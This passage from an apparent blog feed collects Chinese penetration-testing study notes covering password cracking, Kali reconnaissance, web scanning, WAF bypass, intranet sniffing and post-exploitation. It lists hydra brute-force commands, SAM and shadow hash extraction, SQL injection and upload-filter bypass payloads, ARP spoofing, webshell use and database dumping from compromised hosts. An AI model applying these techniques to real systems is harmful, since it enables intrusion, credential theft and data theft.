2.ftp://ftp.ox.ac.uk.pub/wordlists 3.http://packetstormsecurity.nl/Crackers/wordlists 4.www.outpost9.com/files/WordLists.html 5.http://rs159.rapidshare.com/files/184075601/BlackKnightList.rar 前面的4个站点均稍微有点卡，不过能够下载，Linux环境使用 第5个发现链接错误，可能取消了。 (二)彩虹表 1.http://ophcrack.sourceforge.NET//彩虹表破解工具 2.http://project-rainbowcrack.com//彩虹表下载 (三)Windows密码 工具： 1.pwdump3(用来从WindowsSAM数据库中提取密码散列) 2.John the Ripper(用来破解Windows和linux/Unix密码的散列) 步骤： 1.C盘下创建passwords目录 2.从www.openwall.com/passwords/dll/pwdump/pwdump3v2.zip下载文件 3.从www.openwall.com/john下载文件 4.运行：c:\passwords\pwdump3 &gt; cracked.txt，将WindowsSAM密码散列重定向到cracked.txt文件中。 5.运行：c:\passwords\john cracked.txt，利用john the ripper破解散列 破解时间由字典及密码复杂度等情况决定 (四)Unix密码 前提：需要对系统、密码(/etc/passwd)文件和shadow密码(/etc/passwd)文件具有root访问权限。 1.从www.openwall.com/john下载Unix版源文件 2.输入：tar -zxf john-1.7.1.tar.gz 3.进入提取该程序时创建的/src目录，输入：make generic 4.进入/run目录，并输入：./unshadow /etc/passwd /etc/shadow &gt; cracked.txt，使用unshadow程序将passwd文件盒shadow文件合并，并将其复制到cracked.txt文件中。 5.输入：./john cracked.txt 开始破解 PS：1.使用John the Ripper的Windows版或DOS版，可在Windows系统上破解UNIX密码。 2.并不是在所有的UNIX变体中都适用。 (五)BIOS密码 厂商默认BIOS密码：http://www.cirt.net/passwords (六)Google_Hacking http://johnny.ihackstuff.com/ghdb/ Google攻击数据库 http://ghh.sourceforge.Net/]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记33-kaliWEB漏洞扫描]]></title>
    <url>%2F2018%2F09%2F11%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B033-kaliWEB%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%2F</url>
    <content type="text"><![CDATA[***w3af*** w3af是web application attack and audit framework(web应用攻击和安全审计框架)的缩写 它是一个开源的web应用安全扫描器和漏洞利用工具 两种使用方式: 一种图形界面 二种是命令行 apt -get install man //直接通过网络下载软件 指定软件源怎么指定呢? vi /etc/apt/sources.list 国内快一些 国外的话,要翻墙 reg:www.youtube.com Linux可以用ss来连接 shadowsocks-master.zip 用百度-&gt;shadownsocks来搜索 unzip shadowsocks-master.zip cd shadowsocks-master/ python setup.py install --安装 建立configjson的配置文件 用vi编辑 cat config.json vi config.json www.uudaili.net 关注微信平台 发送2 可以回复用户名,密码 可以试用4个小时 www.uudili/org/free.html 配置一下就好了 然后运行 sslocal -c config.json -d start 浏览器需要安装一个插件-&gt;Add-ons-&gt;搜索里写autoproxy 安装一个就可以了,一个小福字 打开-&gt;edit-&gt;Name,Host,Port,socks5-&gt;OK 右边的下拉三角选择When not matching:ss2(Name) 点击启动它,变红色就可以了 https://www.youtube.com 代理之后速度就快了 要更新w3af才能在kali2.0使用 w3af官网 git clone --depth 1 https://github.com/andresriancho/w3af.git cd w3af ./w3af_gui //14:54]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记32-kaliWEB漏洞扫描]]></title>
    <url>%2F2018%2F09%2F11%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B032-kaliWEB%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%2F</url>
    <content type="text"><![CDATA[电脑配置: 32G内存 DDR4 2300HZ i7 1T固态 --&gt;mac pro会更快,2-3万都未必有这效果 --&gt;准系统,配置比较高,但是价钱还可以的系统 工具型网站: searchdns.netcraft.com netcraft.com 站长工具 http://tool.chinaz.com/ http://www.aizhan.com/爱站网 Google hacker shodan.io 百度-&gt;www.ip138.com 百度-&gt;微步在线 百度-&gt;https//www.shodan.io 安装这个插件就好了 要挂vpn访问shodan 要注册账号,显示内容才会完整. shodan:搜索hostname:baidu.com shodan:搜索ip:221.2.43.242 或 221.2.43.0/24 shodan:搜索port:23 country:CN city:jinan shodan新手指南:blog.csdn.net/wyvbboy/article/details/53464101 cmd-&gt;telnet +ip user:cisco password:cisco 试一下 看是不是windows,有没有windows的信息 综合扫描: DMitry(deepmagic Information Gathering Tool)是一个一体化的信息收集工具,它可以用来收集以下信息: 1.端口扫描 2.whois主机IP和域名信息 3.从Netcraft获取主机信息(国外网站) 4.子域名 5.域名中包含的邮件地址 尽管这些信息可以在Kali中通过多种工具获取,但是使用DMitry可以将收集的信息保存在一个文件中,方便查看 dmitry -wnpb cracer.com dmitry -winse cracer.com 扫描网站注册信息 dmitry -p cracer.com -f -b 查看主机开放端口 //直接在linux输入dmitry可以查看语法 REcon-ng 与MSF的使用方法非常类似,插播一下msf使用基础流程. 第一步,search name模块 第二步,use name模块 第三步,info查看模块信息 第四步,show payloads查看该模块可以使用的攻击载荷(为scanner的时候不需要) 第五步,set payload载荷 第六步,show targets查看该攻击载荷使用的系统类型(为scanner的时候不需要) 第七步,set targets num 设置目标的系统类型 search baidu use +Recon下的语句 show options set SOURCE baidu.com 设置攻击目标 run (相当于搜索子域名) 搜集到信息之后 选择reporting/csv use reporting/csv run cat results.csv 也可以公司职员信息收集,域名信息收集 服务器漏洞扫描: 针对于web服务器的各种漏洞扫描工具的使用展开学习 skipfish 是一款web应用安全侦查工具,skipfish会利用递归爬虫和基于字典的探针生成一副交互式网站地图,最终生成的地图绘制通过安全检查后输出. 使用方法: skipfish -o(输出位置) -w/-s (字典文件位置)(目标网站) 扫描结束后查看输出文件即可.. vega vega是一个安全测试工具,用来爬取一个网站,并分析页面内容来找到链接和表单参数(也可以设置代理) # vega file-&gt;重置工作台,1.直接扫描:红色按钮-&gt;输入网址 /或者可以选择过滤不爬哪些目录,如果有补丁用户的可以添加cookie 也可以移出某些cookie,finish.点击scaner-&gt;yes 红色是高危,cross-site script include(跨站请求) 2.代理扫描:Mantra代理用插件就好,http://burp-&gt;CA Certificate(证书)保存文 针对https:然后Mantra-&gt;选项,高级,加密,查看证书,服务器,导入证书-&gt;找到PortSwigger CA -&gt;编辑信任.信任此证书,以及此证书可以标识web站点. 就可以https//www.baidu.com的https的包了 vega-&gt;右侧Proxy-&gt;左侧Window-&gt;Preferences首选项 可以设置代理,可以复制自己想要的代理,然后override client User-Agent Prevent browser caching,不用缓存的意思 Prevent intermediate(proxy) caching 擦除代理缓存 都可以勾选. Listener: Scanner: OK 打开浏览器-&gt;首选项-&gt;启用设置好的代理. vega的上方File下面有个start按钮,开启它 浏览器:http://www.qufutuan.com 工具抓到后,点击start一栏的倒数第二个,进行扫描 ***w3af*** w3af是web application attack and audit framework(web应用攻击和安全审计框架)的缩写 它是一个开源的web应用安全扫描器和漏洞利用工具 两种使用方式: 一种图形界面 二种是命令行 Linux关闭代理:浏览器-&gt;Preferences-&gt;Advanced-&gt;Network-&gt;Settings-&gt;Use system proxy settings 打开:Manual proxy configuration 127.0.0.1 8888 nikto Nikto是一款开放源代码的,功能强大的WEB扫描评估软件,能对web服务器多种安全项目进行测试的扫描软件,去寻找已知有名的漏洞,能在230多种服务器上扫描出2600多种有潜在危险的文件,CGI及其他问题,它可以扫描指定主机的WEB类型,主机名,特定目录,COOKIE,特定CGI漏洞,返回主机允许的http模式等.它也使用LibWhiske库,但通常比Whisker更新的更为频繁.Nikto是网管安全人员必备的WEB审计工具之一. -h 指定扫描的目标 -p 端口 nikto -h www.xiaojin.org -T 9 nikto -h www.xiaojin.org -p 80,8080,8001 -o 指定输入结果 -C 指定CGI目录 -all表示猜解CGI目录 nikto -h www.xiaojin.org -o result.txt nikto -h www.xiaojin.org -C all -T选项包含很多小选项 -T 9表示扫描SQL注入漏洞. nikto -h http://www.qufutuan.com -o -T c /root/qu.txt]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记31-kali安装信息收集]]></title>
    <url>%2F2018%2F09%2F11%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B031-kali%E5%AE%89%E8%A3%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%2F</url>
    <content type="text"><![CDATA[web高级渗透测试工程师 kali安装-信息搜集-服务器扫描 Kali Linux前身是BackTrack(基于ubuntu)是一个基于Debian的Linux发行版,包含很多安全和取证方面的相关工具.支持ARM架构 Kali Linux是基于Debian的Linux发行版,设计用于数字取证和渗透测试和黑客攻防.由Offensive Security Ltd维护和资助.最先由Offensive Security的Mati Aharoni和Devon Kearns通过重写BackTrack来完成,BackTrack是他们之前写的用于取证的Linux发行版. Kali Linux预装了许多渗透测试软件,包括nmap(端口扫描器),Wireshark(数据包分析器),John the Ripper(密码破解器),以及Aircrack-ng(一套用于对无线局域网进行渗透测试的软件).用户可通过硬盘,live CD或live USB运行Kali Linux.Metasploit的Metasploit Framework支持Kali Linux.Metasploit一套针对远程主机进行开发和执行Exploit代码的工具. 取证可以电子取证,逆向可以逆向,无线可以无线. kali-tools/tools_zh.html:对kali工具包的中文翻译 Kali-系统安装 u盘安装 win32 Disk Imager 改引导启动即可 (之前是写到光盘里面,通过光盘引导,直接用) (u盘的话8G就够了) Kali-安卓系统安装 Linux deploy ssh vnc安装 (三个工具包,deploy用来下载kali镜像的,ssh终端连接界面,vnc是连接图形界面的) 设置源ip http://202.141.160.110/kali(如果安到安卓的话) (这个ip源下载下来是4G的,而且里面没有工具) 连接配置安装软件即可 获取Kali,官网,download 32bit就行 Torrent是先下载种子,,ISO是直接下载镜像 下面还有人家直接安装好的.kali image download light版本(轻量级)一般不用,用完整版 iso安装 VM-&gt;新建-&gt;典型-&gt;下一步-&gt;xuanDebian 7.x -&gt;路径-&gt;硬盘大小:(如果只用里面工具的话,10G) -&gt;内存2G-&gt;如果要破解无线的话要保留USB(USB无线网卡) CD:ISO安装镜像 启动VM Install live(686-pae):直接引导 安装硬盘用install 选中文就行 (网络尽量不要使用.net,用Vmnet1)(net会自动更新系统) 主机名: kali 域名:回车 root密码: root 分区方法: (真实机:1.一个新系统点第一个. 2.留20G的空空间给它) 这里点第一个整个硬盘 将所有文件放同一分区 分区写入磁盘-&gt;yes 安完之后接下来安装工具,然后快照 是否使用网络镜像:这里要点no 将GRUB安装到MBR上:yes 选择/dev/sda 结束安装:点击&lt;继续&gt; 安装VMTools 打开终端 df -T 看是否有挂载 cd /media/cdrom0 ls tar -zxvf VM...tar.gz -C /root 最后是指定解压目录 安装之后, cd cd vm.../ ./vm..pl 回车 回车 回车 回车 回车 安完之后 reboot重启 安装过程完毕 信息收集: robots.txt文件 whois查询 DNS查询 敏感目录 端口探测 整站识别 waf探测 工具网站及Google hacker robots.txt 获取网站隐藏敏感目录活文件 reg:安装目录,上传目录,编辑器目录,管理目录,管理页面等. whois搜集: 搜集注册人信息,电话,邮箱,姓名,地址,等相关有用的敏感信息. 常用工具:whois和站长工具 爱站网 whois 不需要输入www,直接域名 whois反查:通过注册人信息,邮箱等 查其他域名 百度-&gt;社工库 百度-&gt;免费社工库 百度-&gt;微步在线(weibuzaixian) reg:可视化分析-&gt;节点 情报社区 DNS搜集: 搜集网站域名信息,如子域名,其他域名,解析服务器,区域传送漏洞等. 常用工具:dnsenum,dig,fierce DNS信息搜集: dnsenum可以通过字典或者谷歌猜测可能存在的域名,并对一个网段机进行反查. dnsenum -enum cracer.com获取其他域名 -r 允许用户设置递归查询 -w 允许用户设置whois请求 -o 允许用户指定输入文件位置 reg: dnsenum --enum qufutuan.com VM8网卡能ping通 Trying Zone Transfers and getting Bind Versions:(区域文件传输漏洞) 区域文件传输漏洞:dns解析,主dns,还有一个辅助dns 如果访问频繁的话,主dns忙不过来,就必须有辅助dns.辅助dns接收主服务器的区域传输.(如果没有做验证的获取主服务器的域名,这样漏洞就产生了) fierce工具主要是对子域名进行扫描和收集信息的.使用fierce工具获取一个目标主机上所有ip地址和主机信息.还可以测试区域传送漏洞. fierce -dns baidu.com 获取其他域名 --wordlist 指定字典 fierce -dns ns9.baidu.com --wordlist host.txt /tmp/12.txt reg:首先出来dns服务器. 然后zone:探测区域传送漏洞 performing 爆破百度的子域名. ls /usr/share/fierce/ 出现hosts.txt wc -l /usr/share/fierce/hosts.txt dig工具也是一款比较流行的dns侦查工具 dig www.cracer.com 查询dns dig -t ns cracer.com 找解析域名的授权dns dig axfr @ns1.dns.net cracer.com 目录扫描: 暴力破解: 暴力破解的方法就是需要一个强大的目录名称字典,用来尝试逐个匹配,如果存在通过响应码回显来确定目录或者页面是否存在 目录爬行: 目录爬行原理是通过一些自带网络蜘蛛爬行的工具对网站链接进行快速爬行. 目录扫描: 目录暴力破解工具: dirb工具是一款非常好用的目录暴力破解工具,自带强大字典. dirb http://www.cracer.com dirb https://www.baidu.com dirb http://www.cracer.com /usr/wordlist.txt kali安装目录:/usr/share/名称 /usr/share/dirb/wordlists/xxx.txt一堆字典 FOCA网站元素搜集工具,一款不错的利器,可以在渗透测试中搜集下网站目录中一些敏感文件,用法简单实用. 下载直接使用即可. evil-foca 目录暴力破解工具: dirbuster工具是一款非常好用的目录暴力猜解工具,自带强大字典 图形界面 输入https//www.cracer.com 配置字典. 高级Options里面有过滤,及认证,Autherntication 是认证 Http里面比较有用的是:可以借助百度爬行蜘蛛进行欺骗,bypass.txt,复制进来替换掉http user agent,,然后网站就对爬行放行了 GO Faster线程太大了,容易把网站烧死. 首页:字典:/usr/share/dirbuster/wordlists/xxx.txt Select starting options:这里第二个选项是说明用下面的加入变量的方式.r reg:/admin/{dir}.asp Scan Information 扫描的信息 可以挂vpn,也可以go again 谷歌镜像 翻墙: 1.挂vpn 2.ssh 3.shadowsock 端口探测工具: 扫描整个子网,命令如下: #nmap 192.168.1.1/24 扫描多个目标,命令如下: #nmap 192.168.1.2 192.168.1.5 扫描一个范围内的目标,如下: #nmap 192.168.1.1-100(扫描ip地址为192.168.1.1-192.168.1.100内的所有主机) 如果你有一个ip地址列表,将这个保存为一个txt文件.和nmap在同一个目录下,扫描这个txt内的所有主机,命令如下: #nmap -iL target.txt 如果你想看你扫描的所有主机的列表,用以下命令: #nmap -sL 192.168.1.1/24 扫描除过某一个ip外的所有子网主机,命令: #nmap 192.168.1.1/24 -exclude 192.168.1.1 NMAP nmap -sF 192.168.1.1 过防火墙扫描 nmap -sL 192.168.1.1 192.168.1.6伪造自己真实ip改为1.1扫描 nmap -O -PN 192.168.1.1/24探测网络系统及不用ping探测,可过防火墙拦截. whatweb 用来识别网站cms及大家平台环境的工具 whatweb http://www.cracer.com whatweb -v https://www.cracer.com 网站服务器+脚本类型+数据库类型+网站容器+cms类型+waf类型 waf id 1=1 看是安全狗/云盾/360... wafw00f 用来识别网站waf的一款工具 wafw00f http://www.cracer.com (不准确)]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记30-waf绕过详解]]></title>
    <url>%2F2018%2F09%2F11%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B030-waf%E7%BB%95%E8%BF%87%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[WAF Web Application Firewalf(web安全防火墙) wtf -waf 针对脚本黑客拦截的 WAF防护原理讲解 目标扫描绕过waf 手工注入绕过waf sqlmap注入绕过waf 编写sqlmap绕过waf脚本 过WAF一句话编写详解 菜刀连接绕过WAF Webshell上传绕过WAF 提权绕过waf and 1=1 正常 1=2 报错 说明有注入漏洞 百度:安全狗 服务器版,网站版 / .0 -0 .1 绕过安全狗 WAF绕过原理讲解: 了解waf防护原理 查看waf防护位置 熟悉防护规则 了解防护机制 查看拦截时间阈值 waf还能拦截cmd,phpinfo等等的函数,中国菜刀一句话拦截 资源防护-&gt;... cc攻击防护规则 单ip访问上限100次/10秒 冻结5分钟 目录扫描绕过waf 两种方式: 第一:修改客户端ip 第二:减慢扫描速度(主要针对100次/10秒) 第三:通过代理欺骗waf 目标ip 信息收集-&gt;OWASP DirBuster-&gt;Options 需要一个bypass.txt 让它默认为百度到的爬行蜘蛛 手工注入过waf 搭建测试环境 了解绕过原理 熟悉常见绕过构造语句 构造绕过测试语句 Navicat去连接数据库 测试需要在数据库里面测试,要先保证数据库里面能查出来,然后才能拿去前台测试 reg:mssql id=5/*^d^*/and/*^c^*/1=1 id=5/*^d^*/and/*^c^*/1=2 报错的话就说明绕过了 之前的注入绕过方法: 1.大小写变种 2.使用SQL注释 3.使用URL编码 4.使用空字节 5.使用嵌套过剥离 6.使用非标准入口点 7.避开自定义过滤器 1.大小写变种 and 1=2 AnD 1=3 2.使用注释: union select 1,2,3,3,4,5 from admin 注释完 /**/union/**/select/**/1,23,44,5,6 from admin /**/un/**/io/**/n/**/sel/**/ec/**/t/**/1,23,45,6, from admin 第二种注释: /*!and*/1=2 (效果显著) 加入特殊符号在注释里,来干扰waf 有些符号加入后数据库能查出数据,但是前台不能正常显示数据 url编码 正常编码 &apos;为%27 / =%2f *==%2a %=%25 /**/==%252f%%252a*/ 还原点击Encoding-&gt;URL decode 使用空字节 一些过滤器在处理输入时,如果碰到空字节就会停止处理 我们通常也会利用空字节进行绕过过滤器 如: id=1 %00 and 1=2 %00在数据库里面是查不出数据的,必须经过url转码 利用嵌套剥离 有些过滤器会从用户的输入中进行剥离一些敏感的函数 那我们可以通过函数的嵌套进行绕过一次剥离 selselectect 剥离后 select 使用非标准入口点 说白了就是攻击他的冷门 需要自己去挖掘 一些连过滤器都没发现的注入点即可 避开自定义过滤器 一些过滤器它所过滤的字符串都是事先写入写好的 只要我们输入的语法和他们过滤打的不匹配即可绕过 比如 and 转换为 a+nd a%nd &apos;a&apos;nd %A0and 总结编写绕过语句: 利用注释 /*^ABC^*/ 包含关键字 /*!/*!/*!union*/ 变换提交方式 将get改为post或者cookie提交 reg:/*!40001and*/1=1 sqlmap tamper利用 symboliclogical.py space2mssqlhash.py appendnullbyte.py 利用修改tamper绕过waf sqlmap.py -u &quot;xx.x.x.x.x?id=2&quot; --delay=1 控制访问时间次数 ,1秒钟延迟 sqlmap.py -u &quot;xx.x.x.x.x?id=2&quot; --delay=1 --tamper=symobliclogical.py 加入插件来跑(cracer博客上讲解了每一个插件是干嘛的) &apos;--dbms&apos;==mysql 如果sqlmap跑出来之后,接下来开始跑下面的: sqlmap.py -u &quot;xx.x.x.x.x?id=2&quot; --delay=1 --tamper=symobliclogical.py --current-db (跑数据库名称) (手工用 order by 19/18) 返回错误/返回正常 跑数据库字段 实战编写过waf一句话 编写过狗一句话思路 利用可变变量 $a=b $b=c $$a=c 利用函数 利用判断语句 利用编码 突破waf拦截菜刀连接 可以使用最新版菜刀 中国蚁剑客户端 可以使用过狗菜刀+中转脚本 上传绕过waf 上传突破禁止上传php文件 第一:文件包含 第二:双文件上传突破限制 第三:修改上传参数 代理抓包,send to repeater connection: close(修改它下面的一句话) reg1:--WebKit....(后面随便改) reg2:filename=&quot;2p.php%00.png&quot; reg3:fo+rm-data; reg4: name--&gt;NAME=&apos;upfile&apos; 提权过waf 通过程序读密码 利用waf绕过神器 利用exp读hash 讲用户添加到远程桌面组,并且给目录降权 利用第三方软件提权 干掉waf必须要在驱动层,不是在应用层,来干掉,得用c写]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记29-内网渗透]]></title>
    <url>%2F2018%2F09%2F11%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B029-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%2F</url>
    <content type="text"><![CDATA[1.信息搜集 2.流量监听 3.arp欺骗 4.密码破解 1.信息搜集 nmap zenmap scanport ntscan arp -a net view 收集信息: 对本地主机收集 本地账号信息 软件账号密码 系统账号密码: 管理员密码 pwdum7 getpass 服务账号密码 ftp smb 对网络主机收集 对外收集:(A,B,C类)C类一般为192.168 探测局域网中存活的主机. nmap nmap 192.168.0.1/24 protscan cmd-&gt; arp -a cmd-&gt; net view WIN+R \\192.168.0.10\c$ xxx网文件共享 WIN+E ftp:// 2.流量监听 wiresharke cain snifferpass 嗅探欺骗-&gt;cain 关闭防火墙. ncpa.cpl 没锁才可以 cain-&gt;打开旁边的&quot;网卡&quot;-&gt;Filters and ports-&gt; 确定之后,再点&quot;网卡&quot; -&gt;Sniffer:嗅探哪些主机 点击右侧-&gt;点击+-&gt;选择网关-&gt;192.168.3.105 开始测试抓包 点击password-&gt;HTTP-&gt;就可以抓到用户名密码了 Services-&gt;Telnet-&gt;需要先安装FTP服务 telnet 192.168.3.130 administrator 123456 ftp 192.168.3.130 administrator 123456 mstsc 监听密码: 3389 telnet ftp http wiresharke :黑客网工都会用(有专门的两本书) 恶意流量,阻塞什么的. services.msi telnet-&gt;启动-&gt;手动应用 安装-&gt;打开-&gt;捕获-&gt;选项-&gt;选择接口 抓包 过滤数据包-&gt;过滤器点击-&gt;http-&gt;post包就能显示了 右击-&gt;追踪流 ip.src==192.168.3.130 &amp; ip.dst==139.129.3.10回车 dst:目标网站 telnet 右击-&gt;追踪TCP流 ftp 右击-&gt;追踪TCP流 cmd-&gt;exit/quit 是退出 文件共享: smb(抓不到,只能抓明文) 右击-&gt;追踪TCP流 3.ARP嗅探 C段:24的掩码 嗅探欺骗-&gt;netFuke 双向欺骗:服务器跟网关 单向欺骗:服务器 设置-&gt;嗅探设置 设置-&gt;ARP欺骗 紫色的点左侧的按钮-&gt;修改器-&gt;注入代码 先安装.Net 再安装Evil Foca 特点:不同的网络也能探测出来 DNS Hijacking Domain www.baidu.com ip 192.168.3.1 4.密码爆破 hydra 参数详解: -R 根据上一次进度继续破解 -S 使用SSL协议连接 -s 指定端口 -l 指定用户名 -L 指定用户名字典(文件) -p 指定密码破解 -P 指定密码字典(文件) -e 空密码cancel和指定用户密码探测(dns) -C 用户名可以用:分割(username:password)可以代替-l username -p password -o 输出文件 -t 指定多线程数量,默认为16个线程 -vV xianshi详细过程 server 目标ip service 指定服务名(telnet ftp pop3 mssql mysql ssh ssh2...) 使用案例: 使用hydra破解ssh密码 hydra -L users.txt -P password.txt -vV -o ssh.log -e ns IP ssh 破解smb: # hydra -l administrator -P pass.txt IP smb 破解rdp: #hydra IP rdp -l administrator -P pass.txt -V 破解telnet # hydra IP telnet -l 用户 -P 密码字典 -t 32 -s 23 -e ns -f -V 破解ftp: # hydra ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV # hydra ftp -l 用户名 -P 密码字典 -e ns -vV 破解cisco: # hydra -P pass.txt IP cisco # hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable 爆破常见的服务: smb telnet ftp 3389 mssql mysql 使用案例 破解Sqlserver密码 hydra.exe -l sa -p c:pass.txt 192.168.2.3 mssql 破解Mysql密码 hydra.exe -l root -p c:\pass.txt 192.168.2.3 mysql 离线爆破: 在线爆破:kali 密码攻击-&gt;hydra-&gt; 加载字典是大写P ip后面要跟服务名 GPU+线程高+内存高爆破才行]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记28-后渗透攻击02]]></title>
    <url>%2F2018%2F09%2F11%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B028-%E5%90%8E%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB02%2F</url>
    <content type="text"><![CDATA[爬图片的链接,爬图片所在的目录,通过上传的目录就能判断出来用的什么编辑器 reg:uploadfile/201703133235.jpg -&gt;这个格式就是eweb usr/image/ --&gt;fck 一般编辑器就是在ewebxxx目录下 ,找到editor目录 综合利用: 数据挖掘 vpn搭建 源码打包 黑客脱裤 挖掘有用的信息: 数据库 数据文件 相关账号 可利用的软件 获取管理员密码 上传权限提升-&gt;getpass 找mysql目录,data,user.MYD 可以翻查用户桌面查找敏感文件 My Documents vpn搭建: vpn是虚拟专用链路通道 通过账号登录vpn服务器,通过vpn的ip来访问目标主机 工具搭:reg:openvpn 需要有网卡 VM-&gt;添加网络适配器-&gt;开始-&gt;管理您的服务器-&gt;远程访问VPN-&gt;选一个外网ip-&gt;手动指定范围192.168.2.100-192.168.2.200,即连接后获取一个内网ip来与内网进行通信 企业搭vpn,供管理员出差时可以进入到内网中进行访问,然后访问的话,用服务端外网路由端口访问 管理-&gt;...-&gt;允许拨入 网络-&gt;新建-&gt;VPN-&gt;ip肉鸡ip-&gt;user,pw(需要验证肉鸡用户名,密码) Linux搭建vpn: http://www.vkilo.com/install-pptp-vpn-rhel-linux.html # ping www.baidu.com ifconfig /* yum list pptpd/yum install pptpd 或者手动下载 cd /usr/local/src #For 32bit os wget http://poptop.sourceforge.net/yum/stable/packages/pptpd-1.4.0-1.el6.i686.rpm rmp -dhv pptpd-1.4.0-1.el6.i686.rpm */ #rpm -ivh http://poptop.sourceforge.net/yum/stable/packages/pptpd-1.4.0-1.el6.i686.rpm //直接在远程端进行下载 /* 安装完成后,配置pptp vpn vim /etc/pptpd.conf 执行到39行,在其前面加#注释掉 #logwtmp: localip 192.168.0.1 //本地ip remoteip 192.168.0.234-238,192.168.0.245 //给客户端分发的网段 */ # vi /etc/pptpd.conf 找localip,remoteip,上下两个用哪个都可以 ,然后可以自己手动设置 编辑/etc/ppp/chap-secrets //主要为了添加一个vpn连接的用户信息 # vi /etc/ppp/chap-secrets user1 pptpd 123123 * //ip如果写*的h话,就是允许所有ip进行访问 # vi /etc/ppp/options.pptpd 把ms-dns修改为 ms-dns 8.8.8.8 ms-dns 4.2.2.2 把debug打开,即取消掉注释 把路由转发启用 # vi /etc/sysctl.conf 将net.ipv4.ip_forward=0 改为1 0代表不转发,1代表转发 # sysctl -p //生成策略 防火墙配置: #请选择显示为外网ip的网卡 iptables -A INPUT -i eth1 -p tcp --dport 1723 -j ACCEPT iptables -A INPUT -i eth1 -p gre -j ACCEPT iptables -t nat -A POSTROUTING -o eth1 -j MASQUERADE #保存防火墙设置并重启防火墙 service iptables save service iptables restart 或者直接将防火墙关闭 iptables -F service pptpd start #可以设置开机启动pptpd chkconfig pptpd on #选做 tail -f /var/log/messages 然后就可以连接linux了 源码打包 jsp的话一般用war打包也是可以的,不用上传打包马 asp就直接asp大马 大马-&gt;服务器打包-&gt;一般是根目录打包-&gt;会生成HSH.mdb文件 然后下载就可以访问下载了 下载之后,建一个文件夹,里面一个小旋风,一个大马,一个mdb 然后大马-&gt;服务器打包-&gt;解包-&gt;然后源代码到手 php脱裤: 打包马-&gt;phpmyzip-&gt;指定路径-&gt;压缩-&gt;然后在指定路径生成一个文件 ,如果超过自身能力的话,大马会自杀.. jsp打包: java war打包 winrar cmd-&gt; C:&gt;cd myHome C:/myHome/&gt;jar cvf myhome.war */. jar cvf[A=&gt;&gt; war包名].war[B=&gt;&gt; 资源文件或文件夹][C=&gt;&gt; 将要生成war包的目标文件夹] &quot;*/&quot; (B=&gt;&gt; )代表当前目录(C:/myHome)下的所有文件及文件夹 &quot;.&quot; (C=&gt;&gt; )表明将要在当前目录中生成war包 jar cvf 生成路径/xx.war 要打包的路径/. 解包 tomcat 黑客脱裤: sqlserver:有注入就用sqlmap去拖 没有注入就上传木马拖,权限提升-&gt;脱裤马 webshell-&gt;脚本木马大全 大马-&gt;select * from 表名 菜刀-&gt;连接上-&gt;右键数据库管理脱裤 数据管理-&gt;sqltools-&gt;远程拖,要开到外链才能连接 Navicat Premium-&gt;右键新建链接-&gt;(也需要外接)xxx 192.168.3.102 , sa 123456 mysql跟sqlserver基本一样的 数据管理-&gt;脱裤马-&gt;mysql-&gt;admin.php 这个大马可以操作很多种数据库]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记27-后渗透攻击]]></title>
